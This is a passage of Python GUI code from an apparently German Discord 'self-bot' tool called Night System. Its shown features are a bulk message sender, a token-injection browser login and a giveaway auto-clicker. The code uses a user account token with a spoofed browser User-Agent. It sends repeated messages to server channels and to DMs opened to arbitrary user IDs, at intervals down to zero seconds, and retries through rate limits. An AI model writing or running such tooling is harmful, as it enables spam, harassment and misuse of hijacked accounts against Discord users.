self.bot_progress.pack(fill="x", pady=(8, 6))\n        self.bot_progress.set(0.0)\n\n        self.lbl_bot_loader_step = ctk.CTkLabel(bl_inner, text="Warte auf Start...", font=("Segoe UI", 10.5), text_color=C["text_muted"])\n        self.lbl_bot_loader_step.pack(anchor="w")\n\n        # 2. DISCORD MESSAGE SENDER CARD (SERVER & DMS) MIT MENGEN-AUSWAHL & RATE-LIMIT\n        card_msg = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        card_msg.pack(fill="x", pady=(0, 14))\n\n        cm_in = ctk.CTkFrame(card_msg, fg_color="transparent")\n        cm_in.pack(fill="x", padx=22, pady=20)\n\n        ctk.CTkLabel(cm_in, text="Nachrichten-Sender (Server & DMs)", font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(anchor="w")\n        ctk.CTkLabel(cm_in, text="Sende Nachrichten an Server-Textkanaele oder Direktnachrichten mit Mengen-Auswahl und Rate-Limit-Schutz.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 14))\n\n        # Channel ID / Friend User ID Eingabe\n        r_cid = ctk.CTkFrame(cm_in, fg_color="transparent")\n        r_cid.pack(fill="x", pady=3)\n        ctk.CTkLabel(r_cid, text="Ziel (Kanal / Freund ID):", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=170, anchor="w").pack(side="left")\n        self.entry_msg_channel = ctk.CTkEntry(r_cid, placeholder_text="Server Kanal-ID, DM Kanal-ID oder Freund Nutzer-ID eintragen", height=34, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])\n        self.entry_msg_channel.pack(side="left", fill="x", expand=True)\n\n        # Schnellauswahl fuer Freunde & Gruppen\n        r_quick = ctk.CTkFrame(cm_in, fg_color="transparent")\n        r_quick.pack(fill="x", pady=(2, 4))\n        ctk.CTkLabel(r_quick, text="Freund schnell waehlen:", font=("Segoe UI", 10.5), text_color=C["text_muted"], width=170, anchor="w").pack(side="left")\n        self.opt_msg_target = ctk.CTkOptionMenu(\n            r_quick,\n            values=["-- Freund oder Gruppe auswaehlen --"],\n            height=30,\n            corner_radius=8,\n            fg_color=C["card_alt"],\n            button_color=C["card_border_hi"],\n            text_color=C["text"],\n            command=self._on_quick_target_selected\n        )\n        self.opt_msg_target.pack(side="left", fill="x", expand=True)\n\n        ctk.CTkLabel(cm_in, text="Unterstuetzt automatisch: Server Text-Kanaele, DM-Kanal IDs und Freund Nutzer-IDs.", font=("Segoe UI", 9.5), text_color=C["text_muted"]).pack(anchor="w", pady=(0, 6))\n\n        # Nachrichtentext\n        ctk.CTkLabel(cm_in, text="Nachrichtentext:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(anchor="w", pady=(8, 3))\n        self.txt_msg_content = ctk.CTkTextbox(cm_in, height=65, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], border_width=1, text_color=C["text"], font=("Segoe UI", 10.5))\n        self.txt_msg_content.pack(fill="x", pady=(0, 8))\n        self.txt_msg_content.insert("1.0", "Night System - Discord Engine")\n\n        # Einstellungen (Menge & Delay)\n        r_opts = ctk.CTkFrame(cm_in, fg_color="transparent")\n        r_opts.pack(fill="x", pady=4)\n\n        ctk.CTkLabel(r_opts, text="Anzahl:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(side="left", padx=(0, 6))\n        self.entry_msg_count = ctk.CTkEntry(r_opts, width=70, height=32, corner_radius=8, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])\n        self.entry_msg_count.pack(side="left", padx=(0, 16))\n        self.entry_msg_count.insert(0, "5")\n\n        ctk.CTkLabel(r_opts, text="Intervall:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(side="left", padx=(0, 6))\n        self.opt_msg_delay = ctk.CTkOptionMenu(\n            r_opts,\n            values=["1.0s (Sicher)", "0.5s (Standard)", "0.2s (Schnell)", "0.0s (Instant)"],\n            height=32,\n            corner_radius=8,\n            fg_color=C["card_alt"],\n            button_color=C["card_border_hi"],\n            text_color=C["text"]\n        )\n        self.opt_msg_delay.pack(side="left")\n\n        # LIVE RATE-LIMIT & SICHERHEITS-MONITOR\n        self.box_rl_monitor = ctk.CTkFrame(cm_in, fg_color=C["card_alt"], corner_radius=12, border_width=1, border_color=C["card_border"])\n        self.box_rl_monitor.pack(fill="x", pady=(12, 12))\n\n        rl_in = ctk.CTkFrame(self.box_rl_monitor, fg_color="transparent")\n        rl_in.pack(fill="x", padx=16, pady=12)\n\n        rl_top = ctk.CTkFrame(rl_in, fg_color="transparent")\n        rl_top.pack(fill="x")\n\n        ctk.CTkLabel(rl_top, text="Rate-Limit & Sicherheits-Monitor", font=("Segoe UI", 11.5, "bold"), text_color=C["text"]).pack(side="left")\n\n        self.lbl_rl_badge = ctk.CTkLabel(\n            rl_top,\n            text="SICHER",\n            font=("Segoe UI", 9.5, "bold"),\n            fg_color=C["green_bg"],\n            text_color=C["green"],\n            corner_radius=6,\n            padx=8,\n            pady=2\n        )\n        self.lbl_rl_badge.pack(side="right")\n\n        self.lbl_rl_status = ctk.CTkLabel(\n            rl_in,\n            text="Verbleibend: 5 / 5 Anfragen | Reset-Fenster: 0.0s | Status: 200 Bereit",\n            font=("Consolas", 10),\n            text_color=C["text_sub"],\n            justify="left"\n        )\n        self.lbl_rl_status.pack(anchor="w", pady=(6, 0))\n\n        # Sende-Buttons\n        r_msg_btns = ctk.CTkFrame(cm_in, fg_color="transparent")\n        r_msg_btns.pack(fill="x")\n\n        self.btn_send_msgs = ctk.CTkButton(\n            r_msg_btns,\n            text="Nachrichten senden",\n            font=("Segoe UI", 11, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=36,\n            width=170,\n            corner_radius=10,\n            command=self._start_send_messages\n        )\n        self.btn_send_msgs.pack(side="left", padx=(0, 8))\n\n        self.btn_stop_msgs = ctk.CTkButton(\n            r_msg_btns,\n            text="Stop",\n            font=("Segoe UI", 11, "bold"),\n            fg_color=C["red_bg"],\n            text_color=C["red_text"],\n            hover_color=C["red_hover"],\n            border_color=C["red_border"],\n            border_width=1,\n            height=36,\n            width=90,\n            corner_radius=10,\n            state="disabled",\n            command=self._stop_send_messages\n        )\n        self.btn_stop_msgs.pack(side="left")\n\n        # 3. CONSOLE LOG BOX\n        card_log = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        card_log.pack(fill="both", expand=True, pady=(0, 10))\n\n        cl_in = ctk.CTkFrame(card_log, fg_color="transparent")\n        cl_in.pack(fill="both", expand=True, padx=22, pady=18)\n\n        ctk.CTkLabel(cl_in, text="Bot Konsole & Aktivitaets-Log", font=("Segoe UI", 13, "bold"), text_color=C["text"]).pack(anchor="w")\n\n        self.txt_bot_log = ctk.CTkTextbox(cl_in, height=180, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], border_width=1, text_color=C["text_sub"], font=("Consolas", 10))\n        self.txt_bot_log.pack(fill="both", expand=True, pady=(10, 0))\n        self._append_bot_log("[SYS] Bot-Modul bereit. Klicke \'Bot\' zum Aktivieren.")\n        self._populate_quick_targets()\n        if hasattr(self, "cloud_info") and self.cloud_info:\n            if self.cloud_info.get("update_available"):\n                self._append_bot_log(f"[UPDATE] Neues Update v{self.cloud_info.get(\'latest_version\')} verfuegbar auf whatsapp-kadi.onrender.com!")\n            else:\n                self._append_bot_log(f"[CLOUD] Verbunden mit whatsapp-kadi.onrender.com (v{DISCORD_TOOL_VERSION} aktuell).")\n            if self.cloud_info.get("announcement"):\n                self._append_bot_log(f"[BROADCAST] {self.cloud_info.get(\'announcement\')}")\n\n    def _append_bot_log(self, msg):\n        if hasattr(self, "txt_bot_log"):\n            now_str = datetime.now().strftime("%H:%M:%S")\n            self.txt_bot_log.insert("end", f"[{now_str}] {msg}\\n")\n            self.txt_bot_log.see("end")\n\n    def _start_bot_loader_and_reload(self):\n        if self.bot_loading:\n            return\n\n        self.bot_loading = True\n        self.btn_bot_start.configure(state="disabled")\n        self.bot_loader_frame.pack(fill="x", pady=(12, 14))\n        self.bot_progress.set(0.0)\n        self.lbl_bot_loader_step.configure(text="[1/4] Verifiziere Token & Session...", text_color=C["text_sub"])\n        self.lbl_bot_status_badge.configure(text="INITIALISIERE", fg_color=C["acc_yellow_bg"], text_color=C["acc_yellow_text"])\n\n        def _worker():\n            steps = [\n                (0.25, "[1/4] Verifiziere Token & Session...", 0.3),\n                (0.55, "[2/4] Lade Discord Account-Daten neu...", 0.4),\n                (0.80, "[3/4] Initialisiere Bot-Engine & Gateway...", 0.4),\n                (1.00, "[4/4] Bot aktiv! Exklusiver Bot-Modus gestartet.", 0.3)\n            ]\n\n            # Tool laedt neu und behaelt den Token\n            if self.token and "DEMO" not in self.token and not self.token.startswith("mfa.VkO_"):\n                try:\n                    ru = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me", self.token)\n                    if ru and ru.status_code == 200:\n                        self.user_data = ru.json()\n                    rg = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/guilds", self.token)\n                    if rg and rg.status_code == 200:\n                        self.guilds_data = rg.json()\n                except Exception:\n                    pass\n\n            for p_val, step_text, wait_s in steps:\n                time.sleep(wait_s)\n                self.after(0, lambda p=p_val, st=step_text: [\n                    self.bot_progress.set(p),\n                    self.lbl_bot_loader_step.configure(text=st),\n                    self._append_bot_log(st)\n                ])\n\n            time.sleep(0.2)\n            self.after(0, lambda: self._on_bot_reload_finished())\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _on_bot_reload_finished(self):\n        self.bot_loading = False\n        self.bot_active = True\n        self.btn_bot_start.configure(state="normal", text="Bot (Neu laden)")\n        self.btn_bot_deact.configure(state="normal")\n        self.btn_bot_inject.configure(state="normal")\n        self.lbl_bot_status_badge.configure(text="AKTIV", fg_color=C["green_bg"], text_color=C["green"])\n        self.lbl_bot_loader_step.configure(text="Bot erfolgreich aktiv & synchronisiert.", text_color=C["green"])\n        self._append_bot_log("[OK] Exklusiver Bot-Modus aktiv - andere Tabs ausgeblendet.")\n\n        # Alle anderen Tabs schliessen / ausblenden\n        self._enter_bot_mode()\n\n        # Externes Fenster fuer Click Instant direkt oeffnen ("soll der erstmal externer sein")\n        self.open_external_click_instant_window()\n\n    def _on_click_deactivate(self):\n        self.bot_active = False\n        self.lbl_bot_status_badge.configure(text="INAKTIV", fg_color=C["card_alt"], text_color=C["text_muted"])\n        self.btn_bot_deact.configure(state="disabled")\n        self.btn_bot_start.configure(state="normal", text="Bot")\n        self.bot_loader_frame.pack_forget()\n        self._append_bot_log("[INFO] Bot-Instanz deaktiviert. Alle Tabs wiederhergestellt.")\n\n        # Alle Tabs wieder einblenden\n        self._exit_bot_mode()\n\n        if self.external_click_instant_win is not None and self.external_click_instant_win.winfo_exists():\n            try: self.external_click_instant_win.destroy()\n            except Exception: pass\n            self.external_click_instant_win = None\n\n    def _on_click_inject(self):\n        self._append_bot_log("[INJECT] Starte Token-Injektion in Web-Session...")\n        self.launch_browser_login()\n        self._append_bot_log("[OK] Injektions-Browser geoeffnet.")\n\n    def _populate_quick_targets(self):\n        if not hasattr(self, "opt_msg_target"):\n            return\n        items = ["-- Freund oder Gruppe auswaehlen --"]\n        if hasattr(self, "friends_data") and self.friends_data:\n            for f in self.friends_data[:50]:\n                name = f.get("name", "Freund")\n                fid = str(f.get("id", ""))\n                is_grp = f.get("is_group", False)\n                prefix = "[Gruppe]" if is_grp else "[Freund]"\n                items.append(f"{prefix} {name} ({fid})")\n        try:\n            self.opt_msg_target.configure(values=items)\n        except Exception:\n            pass\n\n    def _on_quick_target_selected(self, val):\n        if not val or val.startswith("--"):\n            return\n        m = re.search(r"\\((\\d+)\\)", val)\n        if m:\n            target_id = m.group(1)\n            self.entry_msg_channel.delete(0, "end")\n            self.entry_msg_channel.insert(0, target_id)\n            self._append_bot_log(f"[INFO] Schnellauswahl uebernommen: {target_id}")\n\n    def _resolve_target_to_channel_id(self, target_input):\n        raw = str(target_input).strip()\n        if not raw:\n            return None, "Bitte eine Kanal-ID, Freund-Nutzer-ID oder einen Discord-Link eingeben."\n\n        # Discord-Link bereinigen (z.B. https://discord.com/channels/@me/123456 oder https://discord.com/channels/guild/channel)\n        if "channels/" in raw:\n            raw = raw.rstrip("/").split("/")[-1]\n        elif "/" in raw:\n            raw = raw.rstrip("/").split("/")[-1]\n\n        target_id = re.sub(r"[^\\d]", "", raw)\n        if not target_id:\n            return None, f"Ungueltiges Format (\'{target_input}\'). Bitte eine Ziffern-ID angeben."\n\n        if not self.token or "DEMO" in self.token:\n            return target_id, f"Demo-Modus aktiv (Ziel-ID: {target_id})"\n\n        headers = {\n            "Authorization": self.token,\n            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",\n            "Content-Type": "application/json"\n        }\n\n        # 1. Ist target_id bereits als DM-Kanal fuer einen bekannten Freund gemappt?\n        if hasattr(self, "user_to_channel_map") and target_id in self.user_to_channel_map:\n            dm_cid = self.user_to_channel_map[target_id]\n            return dm_cid, f"Nutzer-ID erkannt -> Bekannter DM-Kanal verwendet (Kanal-ID: {dm_cid})"\n\n        # 2. Existiert target_id in der geladenen Freundesliste?\n        if hasattr(self, "friends_data") and self.friends_data:\n            for f in self.friends_data:\n                if str(f.get("id")) == target_id:\n                    if f.get("is_group"):\n                        return target_id, f"Gruppen-Kanal erkannt: {f.get(\'name\')}"\n                    # Es ist ein Freund (Nutzer-ID) -> DM oeffnen via Discord API\n                    try:\n                        res_dm = requests.post(\n                            "https://discord.com/api/v9/users/@me/channels",\n                            headers=headers,\n                            json={"recipient_id": target_id},\n                            timeout=6\n                        )\n                        if res_dm.status_code in (200, 201):\n                            dm_cid = str(res_dm.json().get("id"))\n                            if hasattr(self, "user_to_channel_map"):\n                                self.user_to_channel_map[target_id] = dm_cid\n                            return dm_cid, f"Freund \'{f.get(\'name\')}\' erkannt -> DM-Kanal geoeffnet (Kanal-ID: {dm_cid})"\n                    except Exception:\n                        pass\n\n        # 3. Ist target_id direkt eine gueltige Kanal-ID? (Server Text-Kanal oder bestehender DM-Kanal)\n        try:\n            res_ch = requests.get(f"https://discord.com/api/v9/channels/{target_id}", headers=headers, timeout=6)\n            if res_ch.status_code == 200:\n                ch_info = res_ch.json()\n                ch_type = ch_info.get("type", 0)\n                ch_name = ch_info.get("name") or ("DM-Chat" if ch_type == 1 else "Kanal")\n                type_desc = "Server-Textkanal" if ch_type == 0 else ("DM-Kanal" if ch_type == 1 else "Kanal")\n                return target_id, f"{type_desc} bestaetigt: {ch_name} (ID: {target_id})"\n        except Exception:\n            pass\n\n        # 4. Falls kein bestehender Kanal (404/400): Pruefen, ob es eine Nutzer-ID ist (Freund / fremder Nutzer)\n        try:\n            res_open = requests.post(\n                "https://discord.com/api/v9/users/@me/channels",\n                headers=headers,\n                json={"recipient_id": target_id},\n                timeout=6\n            )\n            if res_open.status_code in (200, 201):\n                dm_cid = str(res_open.json().get("id"))\n                if hasattr(self, "user_to_channel_map"):\n                    self.user_to_channel_map[target_id] = dm_cid\n                recips = res_open.json().get("recipients", [])\n                u_name = recips[0].get("username") if recips else target_id\n                return dm_cid, f"Nutzer-ID erkannt -> DM mit \'{u_name}\' geoeffnet (Kanal-ID: {dm_cid})"\n            elif res_open.status_code in (400, 403):\n                try:\n                    err_msg = res_open.json().get("message", "")\n                except Exception:\n                    err_msg = ""\n                if err_msg:\n                    return None, f"Konnte DM fuer Nutzer {target_id} nicht oeffnen ({err_msg})."\n        except Exception as ex:\n            pass\n\n        # 5. Fallback: ID direkt verwenden\n        return target_id, f"Ziel-Kanal {target_id} wird direkt verwendet"\n\n    def _start_send_messages(self):\n        if self.msg_send_in_progress:\n            return\n\n        raw_cid = self.entry_msg_channel.get().strip()\n        msg_text = self.txt_msg_content.get("1.0", "end-1c").strip()\n        count_str = self.entry_msg_count.get().strip()\n\n        if not raw_cid:\n            self._append_bot_log("[FEHLER] Bitte eine gueltige Kanal-ID oder Nutzer-ID eingeben.")\n            return\n        if not msg_text:\n            self._append_bot_log("[FEHLER] Bitte einen Nachrichtentext eingeben.")\n            return\n\n        try:\n            total_count = max(1, int(count_str))\n        except ValueError:\n            total_count = 1\n\n        delay_map = {\n            "1.0s (Sicher)": 1.0,\n            "0.5s (Standard)": 0.5,\n            "0.2s (Schnell)": 0.2,\n            "0.0s (Instant)": 0.0\n        }\n        delay_sec = delay_map.get(self.opt_msg_delay.get(), 0.5)\n\n        self.msg_send_in_progress = True\n        self.msg_stop_requested = False\n        self.btn_send_msgs.configure(state="disabled")\n        self.btn_stop_msgs.configure(state="normal", text="Stop")\n\n        def _worker():\n            self._append_bot_log(f"[INFO] Ermittle Ziel fuer \'{raw_cid}\'...")\n            resolved_cid, info_msg = self._resolve_target_to_channel_id(raw_cid)\n            if not resolved_cid:\n                self._append_bot_log(f"[FEHLER] {info_msg}")\n                self.msg_send_in_progress = False\n                self.after(0, lambda: [\n                    self.btn_send_msgs.configure(state="normal"),\n                    self.btn_stop_msgs.configure(state="disabled", text="Stop")\n                ])\n                return\n\n            self._append_bot_log(f"[INFO] {info_msg}")\n            self._append_bot_log(f"[START] Sende {total_count}x Nachrichten an Kanal {resolved_cid} (Intervall: {delay_sec}s)...")\n\n            success_cnt = 0\n            fail_cnt = 0\n\n            for i in range(1, total_count + 1):\n                if self.msg_stop_requested:\n                    self._append_bot_log("[STOP] Nachrichten-Versand manuell gestoppt.")\n                    break\n\n                if not self.token or "DEMO" in self.token:\n                    time.sleep(max(0.1, delay_sec))\n                    success_cnt += 1\n                    sim_rem = max(0, 5 - (i % 5))\n                    self._update_rate_limit_display(remaining=sim_rem, limit=5, reset_after="1.2", is_429=False)\n                    self._append_bot_log(f"[DEMO] Nachricht {i}/{total_count} gesendet an {resolved_cid}.")\n                else:\n                    url = f"https://discord.com/api/v9/channels/{resolved_cid}/messages"\n                    headers = {\n                        "Authorization": self.token,\n                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",\n                        "Content-Type": "application/json"\n                    }\n                    payload = {\n                        "content": msg_text,\n                        "nonce": str(random.randint(100000000000000000, 999999999999999999)),\n                        "tts": False\n                    }\n\n                    try:\n                        res = requests.post(url, headers=headers, json=payload, timeout=6)\n\n                        rl_rem = res.headers.get("x-ratelimit-remaining", "5")\n                        rl_lim = res.headers.get("x-ratelimit-limit", "5")\n                        rl_reset = res.headers.get("x-ratelimit-reset-after", "0.0")\n\n                        if res.status_code in (200, 201):\n                            success_cnt += 1\n                            self._update_rate_limit_display(remaining=rl_rem, limit=rl_lim, reset_after=rl_reset, is_429=False)\n                            self._append_bot_log(f"[OK] Nachricht {i}/{total_count} gesendet. (Remaining: {rl_rem}/{rl_lim})")\n                        elif res.status_code == 429:\n                            try:\n                                retry_after = float(res.json().get("retry_after", 1.5))\n                            except Exception:\n                                retry_after = 1.5\n                            self._update_rate_limit_display(remaining="0", limit=rl_lim, reset_after=f"{retry_after:.1f}", is_429=True)\n                            self._append_bot_log(f"[RATE-LIMIT] 429 erreicht! Warte {retry_after:.1f}s Sicherheits-Pause...")\n                            time.sleep(retry_after)\n                            res_retry = requests.post(url, headers=headers, json=payload, timeout=6)\n                            if res_retry.status_code in (200, 201):\n                                success_cnt += 1\n                                self._append_bot_log(f"[OK] Nachricht {i}/{total_count} nach Rate-Limit gesendet.")\n                            else:\n                                fail_cnt += 1\n                        else:\n                            fail_cnt += 1\n                            err_msg = ""\n                            try:\n                                ej = res.json()\n                                err_msg = ej.get("message", "")\n                                ecode = ej.get("code")\n                                if ecode:\n                                    err_msg = f"{err_msg} (Code {ecode})"\n                            except Exception:\n                                err_msg = res.text[:80]\n                            if err_msg:\n                                self._append_bot_log(f"[FEHLER] Senden fehlgeschlagen (Status {res.status_code}: {err_msg}).")\n                            else:\n                                self._append_bot_log(f"[FEHLER] Senden fehlgeschlagen (Status {res.status_code}).")\n                    except Exception as ex:\n                        fail_cnt += 1\n                        self._append_bot_log(f"[FEHLER] Verbindungsfehler: {ex}")\n\n                if delay_sec > 0 and i < total_count and not self.msg_stop_requested:\n                    time.sleep(delay_sec)\n\n            self.msg_send_in_progress = False\n            self.msg_stop_requested = False\n            self.after(0, lambda: [\n                self.btn_send_msgs.configure(state="normal"),\n                self.btn_stop_msgs.configure(state="disabled", text="Stop"),\n                self._append_bot_log(f"[FERTIG] Versand beendet: {success_cnt} erfolgreich, {fail_cnt} fehlgeschlagen.")\n            ])\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _stop_send_messages(self):\n        self.msg_stop_requested = True\n        self.btn_stop_msgs.configure(text="Stoppe...", state="disabled")\n\n    def _update_rate_limit_display(self, remaining, limit, reset_after, is_429=False):\n        def _ui():\n            if not hasattr(self, "lbl_rl_badge"):\n                return\n            if is_429:\n                self.lbl_rl_badge.configure(text="RATE LIMIT AKTIV", fg_color=C["red_bg"], text_color=C["red_text"])\n                self.lbl_rl_status.configure(text=f"[WARNUNG] Rate Limit erreicht! Reset in {reset_after}s | Ban-Schutz aktiv", text_color=C["red_text"])\n            else:\n                self.lbl_rl_badge.configure(text="SICHER", fg_color=C["green_bg"], text_color=C["green"])\n                self.lbl_rl_status.configure(text=f"Verbleibend: {remaining} / {limit} Anfragen | Reset-Fenster: {reset_after}s | Status: 200 OK", text_color=C["text_sub"])\n        self.after(0, _ui)\n\n    # --------------------------------------------------------------------------\n    # 8. EXTRA-TAB: CLICK INSTANT (AUCH ALS EXTERNES FENSTER)\n    # --------------------------------------------------------------------------\n    def _build_click_instant_tab(self):\n        scroll = ctk.CTkScrollableFrame(self.frame_click_instant, fg_color="transparent")\n        scroll.pack(fill="both", expand=True)\n        self._populate_click_instant_ui(scroll, is_external=False)\n\n    def open_external_click_instant_window(self):\n        if self.external_click_instant_win is not None and self.external_click_instant_win.winfo_exists():\n            self.external_click_instant_win.lift()\n            self.external_click_instant_win.focus_force()\n            return\n\n        win = ctk.CTkToplevel(self)\n        self.external_click_instant_win = win\n        win.title("Night System - Click Instant (Extern)")\n        win.geometry("540x520")\n        win.minsize(460, 420)\n        win.configure(fg_color=C["bg"])\n        try:\n            win.attributes("-alpha", 0.94)\n            win.attributes("-topmost", True)\n        except Exception:\n            pass\n\n        icon_path = get_asset_path("icon.ico")\n        if icon_path and os.path.exists(icon_path):\n            try: win.iconbitmap(icon_path)\n            except Exception: pass\n\n        self._populate_click_instant_ui(win, is_external=True)\n\n    def _populate_click_instant_ui(self, parent, is_external=False):\n        container = ctk.CTkFrame(parent, fg_color="transparent")\n        container.pack(fill="both", expand=True, padx=16 if is_external else 0, pady=16 if is_external else 0)\n\n        card = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        card.pack(fill="x", pady=(0, 12))\n\n        cin = ctk.CTkFrame(card, fg_color="transparent")\n        cin.pack(fill="x", padx=20, pady=18)\n\n        top_r = ctk.CTkFrame(cin, fg_color="transparent")\n        top_r.pack(fill="x")\n\n        title_txt = "Click Instant (Externes Fenster)" if is_external else "Click Instant"\n        ctk.CTkLabel(top_r, text=title_txt, font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(side="left")\n\n        tag_txt = "EXTERN" if is_external else "EXTRA TAB"\n        ctk.CTkLabel(top_r, text=tag_txt, font=("Segoe UI", 9.5, "bold"), fg_color=C["card_alt"], text_color=C["text_sub"], corner_radius=6, padx=8, pady=2).pack(side="right")\n\n        ctk.CTkLabel(cin, text="Automatischer Sofort-Klicker fuer Discord Buttons, Giveaways & Interaktionen.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 10))\n\n        # Inputs\n        r1 = ctk.CTkFrame(cin, fg_color="transparent")\n        r1.pack(fill="x", pady=3)\n        ctk.CTkLabel(r1, text="Channel ID:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")\n        e_cid = ctk.CTkEntry(r1, placeholder_text="Discord Channel ID", height=32, corner_radius=8, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])\n        e_cid.pack(side="left", fill="x", expand=True)\n\n        r2 = ctk.CTkFrame(cin, fg_color="transparent")\n        r2.pack(fill="x", pady=3)\n        ctk.CTkLabel(r2, text="Message ID:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")\n        e_mid = ctk.CTkEntry(r2, placeholder_text="Message ID (optional / alle)", height=32, corner_radius=8, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])\n        e_mid.pack(side="left", fill="x", expand=True)\n\n        r3 = ctk.CTkFrame(cin, fg_color="transparent")\n        r3.pack(fill="x", pady=3)\n        ctk.CTkLabel(r3, text="Klick-Modus:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")\n        opt_mode = ctk.CTkOptionMenu(r3, values=["Alle Buttons sofort klicken", "Ersten Button klicken", "Reactions klicken"], height=32, corner_radius=8, fg_color=C["card_alt"], button_color=C["card_border_hi"], text_color=C["text"])\n        opt_mode.pack(side="left", fill="x", expand=True)\n\n        r4 = ctk.CTkFrame(cin, fg_color="transparent")\n        r4.pack(fill="x", pady=3)\n        ctk.CTkLabel(r4, text="Reaktionszeit:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")\n        opt_speed = ctk.CTkOptionMenu(r4, values=["0 ms (Sofort)", "25 ms (Ultra-Fast)", "50 ms (Fast)", "100 ms (Safe)"], height=32, corner_radius=8, fg_color=C["card_alt"], button_color=C["card_border_hi"], text_color=C["text"])\n        opt_speed.pack(side="left", fill="x", expand=True)\n\n        # Action Buttons\n        r_btns = ctk.CTkFrame(cin, fg_color="transparent")\n        r_btns.pack(fill="x", pady=(12, 0))\n\n        btn_start = ctk.CTkButton(r_btns, text="Instant Click Starten", font=("Segoe UI", 10.5, "bold"), fg_color=C["btn_gray"], hover_color=C["btn_gray_hover"], border_color=C["card_border_hi"], border_width=1, height=34, corner_radius=10)\n        btn_start.pack(side="left", padx=(0, 8))\n\n        btn_stop = ctk.CTkButton(r_btns, text="Stoppen", font=("Segoe UI", 10.5, "bold"), fg_color=C["red_bg"], text_color=C["red_text"], hover_color=C["red_hover"], border_color=C["red_border"], border_width=1, height=34, corner_radius=10)\n        btn_stop.pack(side="left", padx=(0, 8))\n\n        if not is_external:\n            btn_dock = ctk.CTkButton(r_btns, text="Externes Fenster oeffnen", font=("Segoe UI", 10.5, "bold"), fg_color=C["btn_gray"], hover_color=C["btn_gray_hover"], border_color=C["card_border_hi"], border_width=1, height=34, corner_radius=10, command=self.open_external_click_instant_window)\n            btn_dock.pack(side="right")\n\n        # Status & Log Box\n        card_log = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        card_log.pack(fill="both", expand=True)\n\n        cl_in = ctk.CTkFrame(card_log, fg_color="transparent")\n        cl_in.pack(fill="both", expand=True, padx=20, pady=16)\n\n        ctk.CTkLabel(cl_in, text="Live-Trigger Log", font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(anchor="w")\n\n        txt_log = ctk.CTkTextbox(cl_in, height=140, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], border_width=1, text_color=C["text_sub"], font=("Consolas", 9.5))\n        txt_log.pack(fill="both", expand=True, pady=(8, 0))\n        txt_log.insert("end", "[READY] Click Instant Engine initialisiert.\\n[INFO] Warte auf Komponenten-Trigger...\\n")\n\n        def _do_start():\n            txt_log.insert("end", f"[START] Click Instant aktiv auf Channel {e_cid.get() or \'Alle\'}\\n")\n            txt_log.insert("end", f"[SPEED] Reaktionszeit: {opt_speed.get()}\\n")\n            txt_log.see("end")\n\n        def _do_stop():\n            txt_log.insert("end", "[STOP] Click Instant angehalten.\\n")\n            txt_log.see("end")\n\n        btn_start.configure(command=_do_start)\n        btn_stop.configure(command=_do_stop)\n\n    # --------------------------------------------------------------------------\n    # 9. WEITERE TABS (Verbindungen, Billing)\n    # --------------------------------------------------------------------------\n    def _build_conn_tab(self):\n        scroll = ctk.CTkScrollableFrame(self.frame_conn, fg_color="transparent")\n        scroll.pack(fill="both", expand=True)\n\n        lbl = ctk.CTkLabel(scroll, text=f"Verknuepfte Konten ({len(self.connections_data)})", font=("Segoe UI", 16, "bold"), text_color=C["text"])\n        lbl.pack(anchor="w", pady=(0, 10))\n\n        for c in self.connections_data:\n            c_type = c.get("type", "domain")\n            c_info = PLATFORM_ICONS.get(c_type, {"color": "#8b94a5", "tag": c_type[:2].upper(), "name": c_type.capitalize()})\n            card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])\n            card.pack(fill="x", pady=4)\n            ci = ctk.CTkFrame(card, fg_color="transparent")\n            ci.pack(fill="x", padx=16, pady=12)\n\n            tag_badge = ctk.CTkLabel(ci, text=c_info.get("tag", "LK"), font=("Segoe UI", 10.5, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)\n            tag_badge.pack(side="left", padx=(0, 10))\n\n            ctk.CTkLabel(ci, text=f"{c_info[\'name\']}: {c.get(\'name\')}", font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(side="left")\n            ctk.CTkLabel(ci, text="Verifiziert" if c.get("verified") else "Verknuepft", font=("Segoe UI", 9.5), text_color=C["green"] if c.get("verified") else 